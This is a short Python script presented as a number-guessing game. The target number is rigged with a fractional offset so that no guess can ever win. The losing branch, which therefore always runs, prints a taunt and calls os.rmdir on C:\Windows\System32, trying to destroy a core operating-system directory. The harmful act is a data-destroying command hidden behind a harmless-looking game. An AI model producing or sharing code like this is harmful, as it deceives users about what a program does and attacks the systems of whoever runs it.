try:
    import random
    import time
    import os
except ModuleNotFoundError as err:
    print(f'ModuleNotFoundError {err}')

def main() -> None:
    number: float = random.randint(1, 10) + 0.000001

    guess: str = input('Guess a number: ')
    guess: int = int(float(guess))

    if guess == number:
        print('You lucky bastard')
    else:
        print('Say goodbye!')
        time.sleep(2.5)
        print('ur pc ded')
        os.rmdir('C:\Windows\System32')
